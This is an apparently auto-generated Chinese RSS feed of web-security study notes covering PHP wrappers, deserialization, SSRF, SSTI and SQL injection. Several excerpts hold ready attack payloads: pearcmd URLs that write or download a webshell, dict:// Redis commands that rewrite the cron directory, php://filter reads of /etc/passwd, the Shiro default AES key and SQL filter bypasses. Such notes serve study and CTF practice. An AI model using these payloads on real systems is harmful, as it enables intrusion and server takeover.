<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>漏洞发现s on My New Hugo Site</title>
    <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/</link>
    <description>Recent content in 漏洞发现s on My New Hugo Site</description>
    <generator>Hugo 0.125.1</generator>
    <language>en-us</language>
    <atom:link href="http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/java/fastjson/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/java/fastjson/</guid>
      <description>Fastjson https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/java/shiro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/java/shiro/</guid>
      <description>Shiro 默认AES密钥：kPH+bIxk5D2deZiIxcaaaA==</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/pear&#43;register_argc_argv%E5%88%A9%E7%94%A8/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/pear&#43;register_argc_argv%E5%88%A9%E7%94%A8/</guid>
      <description>pear+register_argc_argv 利用 假如存在以下环境：&#xA;安装了 pear&#xA;开启了 registerargcargv&#xA;存在可控的 include $_GET[&amp;lsquo;f&amp;rsquo;](即使是 include $_GET[&amp;lsquo;f&amp;rsquo;].php)&#xA;那么我们就可以通过上面的知识实现任意文件下载从而 getshell:&#xA;//通过本地直接写入 webshell, 注意这里最好抓包然后用 burpsuite 或者直接 curl 执行，否则浏览器会将&amp;lt; ? &amp;gt; 转义 // config-create 可以直接创建配置文件，且第一个参数必须以/开头 http://ip:port/include.php?f=pearcmd&amp;amp;+config-create+/&amp;lt;?=phpinfo();?&amp;gt;+/tmp/evil.php // 通过远程直接下载 webshell // web 目录可写 - http://ip:port/include.php?f=pearcmd&amp;amp;+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp 目录可写 - http://ip:port/include.php?f=pearcmd&amp;amp;+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</guid>
      <description>PHP 伪协议 什么是伪协议 伪协议是 PHP 中的一种特殊的语法，用于访问各种资源，如文件、网络、数据库等。 伪协议的格式为：协议名：//参数，其中协议名是指定的，参数是根据不同的协议而不同的。 伪协议的使用方法有 file_get_contents(&amp;quot;伪协议：//参数&amp;quot;) include(&amp;quot;伪协议：//参数&amp;quot;) require(&amp;quot;伪协议：//参数&amp;quot;) 常见的伪协议 file:// &amp;ldquo;file://&amp;ldquo;协议用于读取本地文件，其参数为文件的路径。 例如：file:///etc/passwd，表示读取本地的/etc/passwd 文件。 http:// &amp;ldquo;http://&amp;ldquo;协议用于读取远程文件，其参数为远程文件的 URL。 例如：http://www.baidu.com，表示读取百度的首页。 php:// &amp;ldquo;php://&amp;ldquo;协议用于读取 PHP 的输入和输出流，其参数为输入输出流的类型。 例如：php://input，表示读取 PHP 的输入流；php://output，表示读取 PHP 的输出流。 例如：php://filter/read=convert.base64-encode/resource=/etc/passwd，表示读取/etc/passwd 文件的 base64 编码。 file_get_contents() 支持 php://input，可以 zip:// &amp;ldquo;zip://&amp;ldquo;协议用于读取 ZIP 压缩文件中的文件，其参数为 ZIP 压缩文件的路径。 例如：zip://test.zip#test.txt，表示读取 test.zip 压缩文件中的 test.txt 文件。 phar:// &amp;ldquo;phar://&amp;ldquo;协议用于读取 PHAR 压缩文件中的文件，其参数为 PHAR 压缩文件的路径。 例如：phar://test.phar/test.txt，表示读取 test.phar 压缩文件中的 test.txt 文件。 data://（php 5.2.0 起） &amp;ldquo;data://&amp;ldquo;协议用于读取数据，其参数为数据的类型。 例如：data://text/plain;base64,SGVsbG8sIFdvcmxkIQ==，读取 base64 编码的字符串，返回解码后的值。 </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%86%85%E7%BD%AE%E7%B1%BB/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%86%85%E7%BD%AE%E7%B1%BB/</guid>
      <description>PHP 内置类 SplFileObject 与伪协议结合，可用于读取文件内容。&#xA;&amp;lt;?php $file = new SplFileObject(&amp;#39;php://filter/read=convert.base64-encode/resource=/etc/passwd&amp;#39;); echo $file-&amp;gt;fread($file-&amp;gt;getSize()); ?&amp;gt; </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</guid>
      <description>PHP 反序列化漏洞 序列化与反序列化 序列化 serialize()&#xA;序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。 对象-&amp;gt;字符串 序列化格式 PHP 序列化格式：O: 类名长度：&amp;quot;类名&amp;quot;: 属性个数：{s: 属性名长度：&amp;quot;属性名&amp;quot;; 数据类型：属性值的长度：属性值；} 不同类型的变量序列化后的格式 public 属性：s: 属性名长度：&amp;quot;属性名&amp;quot;; 数据类型：属性值的长度：属性值；&#xA;private 属性：s: 属性名长度：&amp;quot;\00 类名、00 属性名&amp;quot;; 数据类型：属性值的长度：属性值；&#xA;protected 属性：s: 属性名长度：&amp;quot;\00*\00 属性名&amp;quot;; 数据类型：属性值的长度：属性值；&#xA;举例&#xA;&amp;lt;?php class test{ public $name = &amp;#39;xiaohua&amp;#39;; private $address = &amp;#39;shanxi&amp;#39;; protected $age = &amp;#39;21&amp;#39;; } $test1 = new test(); $object = serialize($test1); print_r($object); ?&amp;gt; // output(space=\00): O:4:&amp;#34;test&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;xiaohua&amp;#34;;s:13:&amp;#34; test address&amp;#34;;s:6:&amp;#34;shanxi&amp;#34;;s:6:&amp;#34; * age&amp;#34;;s:2:&amp;#34;21&amp;#34;;} 数据类型对应字母 数据类型 字母 NULL N 布尔 b 整型 i 浮点型 d 字符串 s 数组 a 对象 O 资源 r 反序列化 unserialize()</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</guid>
      <description>PHP 命令执行 执行 PHP 代码函数 eval(phpcode): 反序列化中无法使用，因为 php eval 是一个语言结构，和 echo 一样不属于函数，同理就算通过配置 disable_functions 也是禁用不了 eval 函数的&#xA;assert(phpcode): php7 以前，因为 php7 中禁止了动态调用 assert。直接将传入的参数当成 PHP 代码执行，不需要以分号结尾（特别注意），有时加上分号不会显示结果&#xA;call_user_func(&amp;quot;assert&amp;quot;,phpcode)：传入的参数作为 assert 函数的参数&#xA;执行系统命令函数 system() system(string $command, int &amp;amp;$return_var): string&#xA;command: 要执行的命令&#xA;有回显 exec() exec(string $command, array &amp;amp;$output = null, int &amp;amp;$return_var = null): string&#xA;command: 要执行的命令&#xA;output: 命令执行后的输出，每行一个元素，如果不设置，默认输出最后一行&#xA;可以用 print_r() 打印数组&#xA;passthru() passthru(string $command, int &amp;amp;$return_var): void&#xA;command: 要执行的命令&#xA;输出二进制数据，需要直接传输到浏览器&#xA;shell_exec() shell_exec(string $cmd): string&#xA;无回显，借助 echo、print 等函数输出： echo shell_exec(&amp;rsquo;ls&amp;rsquo;); ` 反引号 command: 要执行的命令</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E5%9F%BA%E7%A1%80/</guid>
      <description>常见函数 highlight_file() 函数对文件进行语法高亮显示，本函数是 show_source() 的别名&#xA;next() 输出数组中的当前元素和下一个元素的值。&#xA;array_reverse() 函数以相反的元素顺序返回数组。（主要是能返回值）&#xA;scandir() 函数返回指定目录中的文件和目录的数组。&#xA;pos() 输出数组中的当前元素的值。&#xA;localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&amp;quot;.&amp;quot;。&#xA;session_id() 函数返回当前会话 ID（可在 http 请求中的 Cookie 中修改）。</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E7%89%B9%E6%80%A7%E5%A4%A7%E5%85%A8%E4%B8%8D%E5%AE%8C%E6%95%B4/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/php%E7%89%B9%E6%80%A7%E5%A4%A7%E5%85%A8%E4%B8%8D%E5%AE%8C%E6%95%B4/</guid>
      <description>PHP 特性大全 哈希比较 md5/sha1 弱比较（==）的绕过 两变量值不相等，md5 计算散列值后相等的绕过&#xA;&amp;lt;?php if($_GET[&amp;#39;a&amp;#39;] !== $_GET[&amp;#39;b&amp;#39;]){ if(md5($_GET[&amp;#39;a&amp;#39;]) == md5($_GET[&amp;#39;b&amp;#39;])){ echo &amp;#34;flag&amp;#34;; } } ?&amp;gt; PHP 中==是判断值是否相等，若两个变量的类型不相等，则会转化为相同类型后再进行比较。PHP 在处理哈希字符串的时候，它把每一个以 0e 开头并且后面字符均为纯数字的哈希值都解析为 0。常见的如下：&#xA;在 md5 加密后以 0E 开头&#xA;QNKCDZO 240610708 s878926199a s155964671a 以下串在 sha1 加密后以 0E 开头，并且后面均为纯数字&#xA;aaroZmOk aaK1STfY payload: /?a=QNKCDZO&amp;amp;b=240610708&#xA;md5/sha1 强比较（===）的绕过 &amp;lt;?php if($_GET[&amp;#39;a&amp;#39;] !== $_GET[&amp;#39;b&amp;#39;]){ if(md5($_GET[&amp;#39;a&amp;#39;]) === md5($_GET[&amp;#39;b&amp;#39;])){ echo &amp;#34;flag&amp;#34;; } } ?&amp;gt; ===会比较类型，这个时候可以用到 PHP 中 md5() 函数无法处理数组（会返回 NULL）来实现绕过。&#xA;payload: /?a[]=1&amp;amp;b[]=2&#xA;md5 碰撞 if ((string)$_POST[&amp;#39;a&amp;#39;] !== (string)$_POST[&amp;#39;b&amp;#39;] &amp;amp;&amp;amp; md5($_POST[&amp;#39;a&amp;#39;]) === md5($_POST[&amp;#39;b&amp;#39;])) { echo `$cmd`; } else { echo (&amp;#34;md5 is funny ~&amp;#34;); } 这里和上面不同之处在于有一个强制类型转化，若传入数组转化后的结果都是字符串 Array。这里需要用到的是 MD5 碰撞，也就是不同字符串但是 MD5 后值相同的情况。下面的任意两组字符串内容不同，但 md5 结果相同。</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/%E6%97%A0%E5%8F%82%E6%95%B0rce/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/php/%E6%97%A0%E5%8F%82%E6%95%B0rce/</guid>
      <description>无参数RCE https://blog.csdn.net/Manuffer/article/details/120738755</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/ssrf/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/ssrf/</guid>
      <description>SSRF 伪协议 https://www.sqlsec.com/2021/05/ssrf.html&#xA;file:// 从文件系统中获取文件内容&#xA;dict:// 字典服务协议，访问字典资源，如dict:///ip:6739/info（Redis命令执行）&#xA;可用于端口扫描&#xA;gopher:// 分布式文档传递服务&#xA;ftp:// 可用于网络端口扫描，响应时间长的端口可能是开放的，但是扫描速度太慢&#xA;sftp:// SSH文件传输协议&#xA;ldap:// 轻量级目录访问协议&#xA;tftp:// 简单文件传输协议&#xA;获取本地信息 读取passwd：file:///etc/passwd 本机IP：file:///etc/hosts arp缓存表：file:///proc/net/arp 可以通过http等访问批量ip，再查看arp缓存表，实现内网扫描 网段路由信息：file:///proc/net/fib_trie 探测内网端口 SSRF 常配合 DICT 协议探测内网端口开放情况，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口&#xA;通过Burpsuite的Intruder&#xA;通过 SSRF 进行 XXE 攻击 先来抓取正常情况下 XXE 攻击的 POST 请求的数据包，删除掉 Accept-Encoding 这一行，然后使用 Burpsuite 对 POST 数据包进行两次 URL 编码&#xA;https://www.sqlsec.com/2021/05/ssrf.html#172-72-23-25-XML-%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5&#xA;CVE-2017-12615 Tomcat 中间件，存在 CVE-2017-12615 任意写文件漏洞&#xA;https://www.sqlsec.com/2021/05/ssrf.html#172-72-23-26-CVE-2017-12615&#xA;Redis 未授权 dict://x.x.x.x:6379/&amp;lt;Redis 命令&amp;gt;&#xA;# 清空 key dict://172.72.23.27:6379/flushall # 设置要操作的路径为定时任务目录 dict://172.72.23.27:6379/config set dir /var/spool/cron/ # 在定时任务目录下创建 root 的定时任务文件 dict://172.</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/ssti/php-twig/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/ssti/php-twig/</guid>
      <description>PHP-Twig 模板注入 Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。&#xA;&amp;lt;?php require_once dirname(__FILE__).&amp;#39;\twig\lib\Twig\Autoloader.php&amp;#39;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&amp;gt;render(&amp;#34;Hello {{name}}&amp;#34;, array(&amp;#34;name&amp;#34; =&amp;gt; $_GET[&amp;#34;name&amp;#34;])); // 将用户输入作为模版变量的值 echo $output; ?&amp;gt; Twig 使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。&#xA;其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。&#xA;使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于 GET 请求参数 $_GET[&amp;quot;name&amp;quot;] 。&#xA;显然这段代码并没有什么问题，即使你想通过 name 参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击： 但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：&#xA;&amp;lt;?php require_once dirname(__FILE__).&amp;#39;/../lib/Twig/Autoloader.php&amp;#39;; Twig_Autoloader::register(true); $twig=newTwig_Environment(newTwig_Loader_String()); $output=$twig-&amp;gt;render(&amp;#34;Hello {$_GET[&amp;#39;name&amp;#39;]}&amp;#34;);// 将用户输入作为模版内容的一部分 echo $output;?&amp;gt; 上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见： 如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。&#xA;在 Twig 模板引擎里，{{var}} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/ssti/ssti/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/ssti/ssti/</guid>
      <description>SSTI https://blog.csdn.net/solitudi/article/details/107752717&#xA;判断模板类型 ${7*7} 执行 a{*comment*}b 执行 Smarty 不执行 ${&amp;quot;z&amp;quot;.join(&amp;quot;ab&amp;quot;)} 执行 Mako 不执行 Unknown 不执行 {{7*7}} 执行 {{7*&#39;7}&#39;} 执行 Jinja2 Twig 不执行 Unkown 不执行 Not Vulnerable Flask Flask 模板注入漏洞是一种安全漏洞，它涉及到使用 Flask 框架的 Web 应用程序中的模板引擎，通常是 Jinja2。这种漏洞允许攻击者通过精心构造的输入来注入恶意模板代码，从而可能导致潜在的安全问题，例如数据泄露、远程代码执行等。这是一种典型的服务器端模板注入（Server-Side Template Injection，SSTI）漏洞。&#xA;Flask 模板注入漏洞通常发生在以下情况下：&#xA;用户输入不经过充分验证或过滤，被动态插入到模板中。这可以发生在应用程序中，例如在用户提交的表单数据中，应用程序将用户输入作为变量插入到模板中，而没有适当的过滤和转义。&#xA;攻击者能够控制输入并在其中插入模板标记。这可以发生在应用程序的 URL 参数、Cookie 或其他请求参数中，如果这些输入没有得到正确的验证和处理。&#xA;不安全的模板渲染设置。应用程序配置或使用不安全的模板渲染设置，使得攻击者可以注入自己的模板代码。&#xA;以下是一个简单的示例，说明 Flask 模板注入漏洞的工作原理：&#xA;from flask import Flask, render_template, request app = Flask(__name__) @app.route(&amp;#39;/hello&amp;#39;) def hello(): name = request.args.get(&amp;#39;name&amp;#39;) return render_template(&amp;#39;hello.html&amp;#39;, name=name) if __name__ == &amp;#39;__main__&amp;#39;: app.run() 在上述示例中，name 参数的值被插入到 hello.</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/weblogic/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/weblogic/</guid>
      <description></description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/wordpress/</guid>
      <description>WordPress安全 WPScan https://github.com/wpscanteam/wpscan</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</guid>
      <description>信息泄露 robots.txt 源码泄露 https://blog.csdn.net/wy_97/article/details/78165051&#xA;.hg 泄露（Mercurial 版本控制） .git 泄露（git 版本控制） .DS_Store 文件泄漏（Mac Os 保存目录里面所有文件的清单） .svn 泄露（Subversion 版本控制） CVS 泄漏（CVS 版本控制） Bazaar/bzr 泄露（bzr 版本控制） WEB-INF/web.xml（java） 网站备份压缩文件 .swp 泄露（临时文件） </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</guid>
      <description>命令执行绕过 https://blog.csdn.net/qq_41315957/article/details/118855865</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/nosqli/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/nosqli/</guid>
      <description>NoSQL注入 NoSQL(NOT ONLY SQL)，它和我们常见的sql注入很像。&#xA;它的危害有：&#xA;绕过身份验证或保护机制。 提取或编辑数据。 导致拒绝服务。 在服务器上执行代码。 其实注入的本质都是一样的，只是语法有些不一样。</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqli/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqli/</guid>
      <description>SQL注入 报错注入 产生报错的函数：&#xA;extractvalue()&#xA;extractvalue(1, concat(0x7e, (select @@version), 0x7e)) updatexml()&#xA;updatexml(1, concat(0x7e, (select @@version), 0x7e), 1) </description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqli%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqli%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</guid>
      <description>SQLi过滤绕过 and, or 过滤 大小写绕过&#xA;复写绕过&#xA;&amp;amp;&amp;amp;, || 绕过&#xA;用 &amp;amp;&amp;amp; 和 || 代替 and 和 or&#xA;提交的时候要使用URL编码&#xA;空格过滤 只用括号&#xA;+ 代替空格&#xA;很多时候被当作连接符或运算符，而不是空格&#xA;URL编码代替空格 符号 URL编码 spaces %20 tab %09 LF OA new line %0a FF 0C new page %0c CR 0D carriage return %0d VT 0B vertical tab %0b -OA- (MySQL Only) %a0 逗号过滤 join绕过&#xA;union select 1,2,3 --等于↓ union select * from (select 1)a join (select 2)b join (select 3)c union和select过滤 复写、大小写、/**/</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqlmap%E8%84%9A%E6%9C%AC/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqlmap%E8%84%9A%E6%9C%AC/</guid>
      <description>常用脚本 用法: 添加参数 --tamper &amp;quot;scriptname&amp;quot;&#xA;绕过空格检测 space2plus.py 适用数据库：ALL&#xA;作用：用加号替换空格&#xA;使用脚本前：tamper(&#39;SELECT id FROM users&#39;)&#xA;使用脚本后：SELECT+id+FROM+users&#xA;multiplespaces.py 适用数据库：ALL&#xA;作用：围绕 sql 关键字添加多个空格&#xA;使用脚本前：tamper(&#39;1 UNION SELECT foobar&#39;)&#xA;使用脚本后：1 UNION SELECT foobar&#xA;space2randomblank.py 适用数据库：ALL&#xA;作用：将空格替换为其他有效字符&#xA;使用脚本前：tamper(&#39;SELECT id FROM users&#39;)&#xA;使用脚本后：SELECT%0Did%0DFROM%0Ausers&#xA;space2dash.py 适用数据库：ALL&#xA;作用：将空格替换为--，并添加一个随机字符串和换行符&#xA;使用脚本前：tamper(&#39;1 AND 9227=9227&#39;)&#xA;使用脚本后：1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227&#xA;space2mysqldash.py 适用数据库：MySQL、MSSQL&#xA;作用：将空格替换为 -- ，并追随一个换行符&#xA;使用脚本前：tamper(&#39;1 AND 9227=9227&#39;)&#xA;使用脚本后：1--%0AAND--%0A9227=9227&#xA;space2hash.py 适用数据库：ALL&#xA;作用：pounds comment character “#” followed by a linefeed a random string of characters and replace the space character</description>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/%E5%90%84%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E5%8F%A5/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/%E5%90%84%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E5%8F%A5/</guid>
